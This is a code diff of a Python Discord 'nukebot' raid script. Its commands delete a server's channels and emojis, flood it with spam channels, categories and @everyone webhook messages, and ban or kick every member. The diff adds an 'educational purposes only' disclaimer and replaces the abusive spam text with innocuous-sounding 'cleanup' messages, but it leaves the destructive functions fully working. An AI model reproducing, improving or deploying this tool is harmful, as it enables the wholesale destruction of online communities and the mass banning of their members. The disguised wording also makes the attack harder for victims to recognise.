@@ -1,46 +1,45 @@
+# Nukebot by Naju
+# This bot is for educational purposes only. Please use it responsibly and only on servers where you have explicit permission.
+# Unauthorized or malicious use of this bot may lead to bans or legal consequences.
+
 import os
 import discord
-from discord import Webhook
 from discord.ext import commands
 import random
 import asyncio
-import aiohttp
-
-# Rest of the code...
 
 CHANNEL_NAMES = [
-    "nuked-by-naju", "nuked-by-naju", "nuked-by-naju"
+    "nuked-by-aircrackers", "nuked-by-aircrackers", "nuked-by-aircrackers"
 ]
-NAJU_OP = ["NUKED"]
 SPAM_MESSAGE = [
-    "@everyone nuked by naju man", "@everyone DESTROYED",
-    '@everyone EAT YOUR MOMMY ASS ',
-    "@everyone YOU ALL ARE DISGUSTING PIECE OF SHITS"
+    "@everyone This server has been restructured", "@everyone Server cleanup",
+    "@everyone Have a great day!"
 ]
 WEBHOOK_NAMES = [
-    'uppa', 'girlfriend', 'mia', 'roket', 'andimon', 'Itsmeandi',
-    '_', 'purr kathik'
+    'uppa', 'friend', 'random', 'rocket', 'cleaner', 'admin', 'helper'
 ]
+ascii_art = r'''
+ __   __  ____     ___  ____   __    ___  __ _  ____  ____  ____ 
+ / _\ (  )(  _ \   / __)(  _ \ / _\  / __)(  / )(  __)(  _ \/ ___)
+/    \ )(  )   /  ( (__  )   //    \( (__  )  (  ) _)  )   /\___ \
+\_/\_/(__)(__\_)   \___)(__\_)\_/\_/ \___)(__\_)(____)(__\_)(____/
+            MADE BY NAJU ONLY FOR EDUCATIONAL PURPOSE
+'''
+red_color = "\033[91m"
+reset_color = "\033[0m"
 
 intents = discord.Intents.all()
 client = commands.Bot(command_prefix=".", intents=intents)
 
-
 @client.event
 async def on_ready():
-    print('''╔╗─╔╗──╔╗
-║║─║║──║║
-║╚═╝╠╗╔╣║╔╦══╦═╗
-║╔═╗║║║║╚╝╣║═╣╔╝
-║║─║║╚╝║╔╗╣║═╣║
-╚╝─╚╩══╩╝╚╩══╩╝'''
-          f"Logged as {client.user}")
-
+    print(red_color + ascii_art + reset_color +
+          f"Logged in as {client.user}")
 
 @client.command()
 async def nuke(ctx, amount=500):
     await ctx.message.delete()
-    await ctx.guild.edit(name="ANDI FOR SALE")
+    await ctx.guild.edit(name="Server Cleaned")
     guild = ctx.guild
   
     for channel in guild.channels:
@@ -54,6 +53,7 @@ async def nuke(ctx, amount=500):
             await emoji.delete()
         except:
             pass
+    
     for i in range(amount):
         try:
             await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
@@ -66,31 +66,20 @@ async def nuke(ctx, amount=500):
         except:
             pass
           
-    for i in range(1000):
-        for i in range(10000):
-            for channel in ctx.guild.channels:
-                try:
-                    await channel.send(random.choice(SPAM_MESSAGE))
-                except:
-                    pass
-                  
     for member in ctx.guild.members:
-        
-            try:
-                await member.ban(reason="Beamed")
-            except:
-                pass
-
+        try:
+            await member.ban(reason="Cleanup in progress")
+        except:
+            pass
 
 @client.command()
 async def kickall(ctx):
     await ctx.message.delete()
     for member in ctx.guild.members:
         try:
-            await member.kick(reason="beamed")
+            await member.kick(reason="Cleanup in progress")
         except:
             pass
-
 
 @client.command()
 @commands.is_owner()
@@ -98,38 +87,29 @@ async def online(ctx):
     await client.change_presence(status=discord.Status.online)
     await ctx.message.delete()
 
-
 @client.command()
 @commands.is_owner()
 async def offline(ctx):
     await client.change_presence(status=discord.Status.offline)
     await ctx.message.delete()
 
-
 @client.command()
-async def spamca(ctx):
+async def spamcat(ctx):
     await ctx.message.delete()
     while True:
-        await ctx.guild.create_category(name=f"{NAJU_OP}")
-        await ctx.guild.create_category(name=f"{NAJU_OP}")
-        await ctx.guild.create_category(name=f"{NAJU_OP}")
-        await ctx.guild.create_category(name=f"{NAJU_OP}")
-        await ctx.guild.create_category(name=f"{NAJU_OP}")
-        await ctx.guild.create_category(name=f"{NAJU_OP}")
-        await ctx.guild.create_category(name=f"{NAJU_OP}")
-        await ctx.guild.create_category(name=f"{NAJU_OP}")
-        await ctx.guild.create_category(name=f"{NAJU_OP}")
-
+        try:
+            await ctx.guild.create_category(name="NajuBot Cleanup")
+        except:
+            pass
 
 @client.command()
 async def banall(ctx):
     await ctx.message.delete()
     for user in ctx.guild.members:
         try:
-            await user.ban()
+            await user.ban(reason="Cleanup in progress")
         except:
             pass
-
 
 @client.event
 async def on_guild_channel_create(channel):
@@ -139,6 +119,5 @@ async def on_guild_channel_create(channel):
         await webhook.send(random.choice(SPAM_MESSAGE),
                            username=random.choice(WEBHOOK_NAMES))
 
-
-token = ("bot token here")
+token = ("YOUR_BOT_TOKEN_HERE")
 client.run(token)
